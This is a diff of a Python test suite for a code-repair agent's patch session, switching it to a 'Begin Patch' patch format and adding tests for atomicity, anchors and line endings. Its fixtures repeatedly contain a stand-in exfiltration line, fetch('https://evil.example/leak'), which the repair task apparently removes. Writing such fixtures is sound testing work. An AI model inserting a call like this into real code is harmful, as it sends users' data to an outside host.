@@ -14,7 +14,13 @@ def _files():
 
 
 def _patch(old: str, new: str, path: str = "game.js") -> str:
-    return f"--- a/{path}\n+++ b/{path}\n@@ -1 +1 @@\n-{old}\n+{new}"
+    return (
+        "*** Begin Patch\n"
+        f"*** Update File: {path}\n"
+        f"-{old}\n"
+        f"+{new}\n"
+        "*** End Patch"
+    )
 
 
 def _outcome(**overrides):
@@ -22,7 +28,7 @@ def _outcome(**overrides):
         files=_files(),
         changed=["game.js"],
         tokens=321,
-        logs=["agent patched game.js (1 hunk(s), 24B)"],
+        logs=["agent patched game.js (1 chunk(s), 24B)"],
         note="FIXED: removed fetch call",
         checks_ok=True,
         turns=3,
@@ -41,8 +47,7 @@ def test_session_read_patch_checks_roundtrip():
     assert not s.checks_ok
 
     out = s.apply_patch(
-        "game.js",
-        "```diff\n"
+        "```patch\n"
         + _patch(
             "var score = 0; fetch('https://evil.example/leak');",
             "var score = 0; function tick() { score += 1; }",
@@ -62,40 +67,114 @@ def test_session_read_patch_checks_roundtrip():
 
 def test_session_patch_resets_checks_flag():
     s = code_agent.RepairSession.from_files(_files())
-    s.apply_patch(
-        "game.js",
-        _patch("var score = 0; fetch('https://evil.example/leak');", "var ok = 1;"),
-    )
+    s.apply_patch(_patch("var score = 0; fetch('https://evil.example/leak');", "var ok = 1;"))
     s.run_checks()
     assert s.checks_ok
-    s.apply_patch("game.js", _patch("var ok = 1;", "var broken = ;"))
+    s.apply_patch(_patch("var ok = 1;", "var broken = ;"))
     assert not s.checks_ok  # 新编辑未复检前不可视为通过
 
 
 def test_session_rejects_unknown_path_and_oversize():
     s = code_agent.RepairSession.from_files(_files())
-    assert "not editable" in s.apply_patch("evil.js", _patch("x", "y", path="evil.js"))
+    assert "not editable" in s.apply_patch(_patch("x", "y", path="evil.js"))
     assert "no such file" in s.read_file("nope.js")
     big = "x" * (code_agent.validation.MAX_FILE_BYTES + 1)
     assert "exceeds" in s.apply_patch(
-        "game.js",
-        _patch("var score = 0; fetch('https://evil.example/leak');", big),
+        _patch("var score = 0; fetch('https://evil.example/leak');", big)
     )
     assert s.changed == set()
 
 
 def test_session_rejects_invalid_patch_inputs():
     s = code_agent.RepairSession.from_files(_files())
-    assert "no unified diff hunks" in s.apply_patch("game.js", "replace everything")
-    assert "patch targets" in s.apply_patch(
-        "game.js",
-        _patch("canvas{display:block}", "canvas{display:block;color:white}", path="style.css"),
+    # 非补丁文本：错误消息直接教 V4A 格式
+    assert "Begin Patch" in s.apply_patch("replace everything")
+    # 旧 unified diff：明确指路换格式
+    unified = "--- a/game.js\n+++ b/game.js\n@@ -1 +1 @@\n-a\n+b"
+    assert "unified diff" in s.apply_patch(unified)
+    # 上下文与当前文件不符
+    assert "context not found" in s.apply_patch(_patch("var missing = true;", "var ok = true;"))
+    # bundle 文件集固定，Add/Delete 不支持
+    add = "*** Begin Patch\n*** Add File: new.js\n+var x = 1;\n*** End Patch"
+    assert "Update File" in s.apply_patch(add)
+    # 截断的补丁（缺 *** End Patch）要求重发而不是半套用
+    truncated = (
+        "*** Begin Patch\n*** Update File: game.js\n"
+        "-var score = 0; fetch('https://evil.example/leak');\n+var ok = 1;"
     )
-    assert "did not apply" in s.apply_patch(
-        "game.js",
-        _patch("var missing = true;", "var ok = true;"),
-    )
+    assert "End Patch" in s.apply_patch(truncated)
     assert s.changed == set()
+
+
+def test_session_multifile_patch_is_atomic():
+    s = code_agent.RepairSession.from_files(_files())
+    patch = (
+        "*** Begin Patch\n"
+        "*** Update File: game.js\n"
+        "-var score = 0; fetch('https://evil.example/leak');\n"
+        "+var score = 0;\n"
+        "*** Update File: style.css\n"
+        "-canvas{display:block}\n"
+        "+canvas{display:block;background:#000}\n"
+        "*** End Patch"
+    )
+    out = s.apply_patch(patch)
+    assert "game.js" in out and "style.css" in out
+    assert s.changed == {"game.js", "style.css"}
+    # 任一文件失败则整个补丁不落盘
+    s2 = code_agent.RepairSession.from_files(_files())
+    bad = patch.replace("-canvas{display:block}", "-canvas{display:none}")
+    assert "context not found" in s2.apply_patch(bad)
+    assert s2.changed == set() and "fetch" in s2.read_file("game.js")
+
+
+def test_session_applies_anchored_section_patch():
+    files = _files()
+    files[2]["content"] = (
+        "function setup() {\n  var a = 1;\n}\n"
+        "function update() {\n  var a = 1;\n}\n"
+    )
+    s = code_agent.RepairSession.from_files(files)
+    patch = (
+        "*** Begin Patch\n"
+        "*** Update File: game.js\n"
+        "@@ function update() {\n"
+        "-  var a = 1;\n"
+        "+  var a = 2;\n"
+        "*** End Patch"
+    )
+    assert "run_checks" in s.apply_patch(patch)
+    body = s.read_file("game.js")
+    # @@ 锚点必须命中第二处同名行，setup 里的保持不动
+    assert "function setup() {\n  var a = 1;\n}" in body
+    assert "function update() {\n  var a = 2;\n}" in body
+
+
+def test_session_accepts_missing_begin_sentinel():
+    s = code_agent.RepairSession.from_files(_files())
+    patch = (
+        "*** Update File: game.js\n"
+        "-var score = 0; fetch('https://evil.example/leak');\n"
+        "+var ok = 1;\n"
+        "*** End Patch"
+    )
+    assert "run_checks" in s.apply_patch(patch)
+
+
+def test_session_rejects_noop_patch():
+    s = code_agent.RepairSession.from_files(_files())
+    line = "var score = 0; fetch('https://evil.example/leak');"
+    assert "no changes" in s.apply_patch(_patch(line, line))
+    assert s.changed == set()
+
+
+def test_session_preserves_crlf():
+    files = _files()
+    files[2]["content"] = "var a = 1;\r\nvar b = 2;\r\n"
+    s = code_agent.RepairSession.from_files(files)
+    patch = "*** Begin Patch\n*** Update File: game.js\n-var b = 2;\n+var b = 3;\n*** End Patch"
+    assert "run_checks" in s.apply_patch(patch)
+    assert s.contents["game.js"] == "var a = 1;\r\nvar b = 3;\r\n"
 
 
 def test_skills_expose_runtime_contract():
